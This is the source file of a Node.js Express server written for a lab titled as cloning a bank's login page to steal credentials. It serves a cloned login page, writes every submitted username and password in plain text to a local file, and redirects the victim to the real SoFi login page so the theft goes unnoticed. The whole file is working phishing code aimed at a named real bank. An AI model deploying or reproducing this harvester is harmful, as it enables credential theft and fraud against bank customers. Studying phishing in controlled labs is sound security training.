/*
 * Author: Justin Shultz
 * ID: m8rZr5w8rON0ii9RiwOdQyzmNtB3
 * Lab: Clone the authentication web page of a bank and steal user credentials
 * 
 * This is a simple Node.js server using the Express framework to handle a web form submission.
 * The server serves static files (like CSS, images, and fonts) from a 'public' directory,
 * serves an HTML file from the root URL, and handles a POST request to capture user credentials 
 * from a form submission. The credentials are written to a 'credentials.txt' file, and the user 
 * is then redirected to an external website (https://www.sofi.com/login).
 */

const express = require('express'); // Import the Express framework
const fs = require('fs'); // Import the file system module to handle file operations
const path = require('path'); // Import the path module to handle file paths
const bodyParser = require('body-parser'); // Import middleware to parse incoming request bodies

const app = express(); // Create an Express application
const PORT = 3000;

// Middleware to parse URL-encoded form data and JSON data
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());

// Serve static files (CSS, images, fonts, etc.) from the 'public' directory
app.use(express.static(path.join(__dirname, 'public')));

// Route to serve the main HTML file at the root URL ('/')
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

// Route to handle form submission at '/collect'
app.post('/collect', (req, res) => {
  const { username, password } = req.body;
  const data = `Username: ${username}, Password: ${password}\n`;

  // Append the credentials to 'credentials.txt'
  fs.appendFile('credentials.txt', data, (err) => {
    if (err) {
      console.error('Error writing to file', err);
      res.status(500).send('Error saving data');
    } else {
      console.log('Credentials saved'); // Log a success message
      res.redirect('https://www.sofi.com/login'); // Redirect the user to the SoFi.com
    }
  });
});

// Start the server and listen on the specified port
app.listen(PORT, () => {
  console.log(`Server running on http://localhost:${PORT}`);
});
